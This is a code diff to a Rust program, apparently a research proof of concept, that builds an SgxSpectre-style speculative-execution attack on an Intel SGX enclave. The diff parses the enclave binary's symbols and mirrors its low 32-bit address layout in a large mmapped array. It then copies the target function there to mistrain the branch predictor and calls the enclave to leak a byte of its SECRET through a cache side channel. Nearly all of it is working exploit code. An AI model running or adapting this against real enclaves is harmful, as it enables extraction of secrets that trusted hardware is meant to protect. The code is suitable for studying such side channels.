@@ -62,26 +62,35 @@ fn init_enclave() -> SgxResult<SgxEnclave> {
     )
 }
 
+static mut ENCLAVE: SgxEnclave =
+    unsafe { std::mem::transmute([1u8; std::mem::size_of::<SgxEnclave>()]) };
+
 fn main() -> std::io::Result<()> {
-    setup_measurements();
+    unsafe {
+        let tmp_enclave = match init_enclave() {
+            Ok(r) => {
+                println!("[+] Init Enclave Successful: enclave ID is {}!", r.geteid());
+                r
+            }
+            Err(x) => {
+                return Err(std::io::Error::new(
+                    std::io::ErrorKind::Other,
+                    format!("[-] Init Enclave Failed: {}!", x.as_str()),
+                ));
+            }
+        };
 
-    /*
-    let enclave = match init_enclave() {
-        Ok(r) => {
-            println!("[+] Init Enclave Successful: enclave ID is {}!", r.geteid());
-            r
-        }
-        Err(x) => {
-            return Err(std::io::Error::new(
-                std::io::ErrorKind::Other,
-                format!("[-] Init Enclave Failed: {}!", x.as_str()),
-            ));
-        }
-    };
+        std::ptr::copy(
+            &tmp_enclave as *const SgxEnclave,
+            &mut ENCLAVE as *mut SgxEnclave,
+            1,
+        );
+        std::mem::forget(tmp_enclave);
+    }
 
-    let mut addr = 0;
+    let mut secret_full_addr = 0;
 
-    let result = unsafe { Enclave1_spectre_enclave(enclave.geteid(), &mut addr) };
+    let result = unsafe { Enclave1_spectre_enclave(ENCLAVE.geteid(), &mut secret_full_addr) };
     if result != sgx_status_t::SGX_SUCCESS {
         return Err(std::io::Error::new(
             std::io::ErrorKind::Other,
@@ -89,8 +98,7 @@ fn main() -> std::io::Result<()> {
         ));
     }
 
-    println!("[+] Got addr 0x{:x}", addr);
-    */
+    println!("[+] Got addr 0x{:x}", secret_full_addr);
 
     let cs = Capstone::new()
         .x86()
@@ -140,7 +148,7 @@ fn main() -> std::io::Result<()> {
             minidow_secret_sym = sym;
         } else if symbol_name == "SECRET" {
             secret_sym = sym;
-        } else if symbol_name == "spectre_test" {
+        } else if symbol_name == "access_memory_spectre" {
             spectre_test_offset = sym.st_value as usize;
             spectre_test_size = sym.st_size as usize;
 
@@ -174,9 +182,16 @@ fn main() -> std::io::Result<()> {
         }
     }
 
+    println!("spectre_test_offset: 0x{:x}", spectre_test_offset);
+
+    let base_32bit_offset = (secret_full_addr - secret_sym.st_value) & ((1 << 32) - 1);
+    println!("base_32bit_offset: 0x{:x}", base_32bit_offset);
+
     // map in memory and add a jump at the correct adress
     // see the SgxSpectre paper for more details on why we simulate only the last 32 bits of
     // addresses
+    // note that this isn't really 4GB is size because of the relation we perform by adding
+    // base_32bit_offset
     let mapped_array: &mut [u8; 1 << 32] = unsafe {
         let addr = mmap(
             0 as *mut c_void,
@@ -189,12 +204,38 @@ fn main() -> std::io::Result<()> {
         .unwrap();
         println!("Mmapped 8GB of memory at {:p}", addr);
 
-        std::mem::transmute((addr as usize + (1 << 32)) & (!((1 << 32) - 1)))
+        let mut aligned_addr = (addr as usize + (1 << 32)) & (!((1 << 32) - 1));
+        aligned_addr += base_32bit_offset as usize;
+
+        std::mem::transmute(aligned_addr)
     };
+
+    let top_32bit_offset = (secret_full_addr - mapped_array as *const u8 as u64
+        + secret_sym.st_value)
+        & (!((1 << 32) - 1));
+    println!("top_32bit_offset: 0x{:x}", top_32bit_offset);
 
     println!("Training array allocated at {:p}", mapped_array as *const _);
 
-    let spectre_test_training_fun: extern "C" fn(measurement_array_addr: u64, target_addr: u64) = unsafe {
+    let data_offset_file = elf.section_headers[minidow_secret_sym.st_shndx].sh_offset as i64
+        - elf.section_headers[minidow_secret_sym.st_shndx].sh_addr as i64;
+    let minidow_secret_array_addr = mapped_array as *const _ as usize
+        + unsafe {
+            *(&enclave_binary[(data_offset_file + minidow_secret_sym.st_value as i64) as usize
+                ..(data_offset_file + minidow_secret_sym.st_value as i64 + 8) as usize]
+                as *const _ as *const usize)
+        };
+    let minidow_secret_array_addr_in_enclave =
+        minidow_secret_array_addr as i64 - top_32bit_offset as i64;
+    println!(
+        "Minidow_secret adress inside the enclave: {:x}",
+        minidow_secret_array_addr_in_enclave
+    );
+
+    let spectre_test_training_fun: unsafe extern "C" fn(
+        measurement_array_addr: usize,
+        target_addr: usize,
+    ) = unsafe {
         let dst_addr = &mut mapped_array[spectre_test_offset] as *mut u8;
 
         std::ptr::copy(
@@ -205,7 +246,7 @@ fn main() -> std::io::Result<()> {
 
         // we need to add the statics too if we want the function to work well
         std::ptr::copy(
-            &enclave_binary[minidow_secret_sym.st_value as usize] as *const u8,
+            minidow::MINIDOW_SECRET as *const u8,
             &mut mapped_array[minidow_secret_sym.st_value as usize] as *mut u8,
             minidow_secret_sym.st_size as usize,
         );
@@ -214,6 +255,9 @@ fn main() -> std::io::Result<()> {
             &mut mapped_array[secret_sym.st_value as usize] as *mut u8,
             secret_sym.st_size as usize,
         );
+        for i in 0..128 {
+            *((minidow_secret_array_addr + i) as *mut u8) = b'0';
+        }
 
         // I'm not sadistic enough to put the function in RWX memory.
         println!(
@@ -231,29 +275,31 @@ fn main() -> std::io::Result<()> {
         std::mem::transmute(dst_addr)
     };
 
-    let target = (Wrapping(secret_sym.st_value) - Wrapping(minidow_secret_sym.st_value)).0;
+    let target = (Wrapping(secret_sym.st_value as usize)
+        - Wrapping(minidow_secret_array_addr_in_enclave as usize + 64))
+    .0;
+    println!("target_offset: 0x{:x}", target);
+
+    unsafe extern "C" fn spectre_test_ecall(base_addr: usize, off: usize) {
+        let result = Enclave1_spectre_test(ENCLAVE.geteid(), base_addr as u64, off as u64);
+        if result != sgx_status_t::SGX_SUCCESS {
+            println!("[-] ECALL Enclave Failed: {}!", result.as_str());
+        }
+    }
+
+    setup_measurements();
 
     // yay, training is now possible!
-    spectre_test_training_fun(unsafe { minidow::BASE_ADDR } as u64, target);
+    let spectre = Spectre::new(Some(spectre_test_training_fun), Some(spectre_test_ecall));
+    println!("0x{:x}", minidow::read_ptr(&spectre, || {}, target));
 
     println!("ret_offset: 0x{:x}", ret_offset);
     println!("jb_offset: 0x{:x}", jb_offset);
     println!("jb_dst_addr: 0x{:x}", jb_dst_addr);
 
-    /*
-    let result =
-        unsafe { Enclave1_spectre_test(enclave.geteid(), minidow::BASE_ADDR as u64, addr) };
-    if result != sgx_status_t::SGX_SUCCESS {
-        return Err(std::io::Error::new(
-            std::io::ErrorKind::Other,
-            format!("[-] ECALL Enclave Failed: {}!", result.as_str()),
-        ));
+    unsafe {
+        std::mem::take(&mut ENCLAVE).destroy();
     }
-
-    println!("{:?}", minidow::measure_byte::<minidow::Spectre>());
-
-    enclave.destroy();
-    */
 
     Ok(())
 }
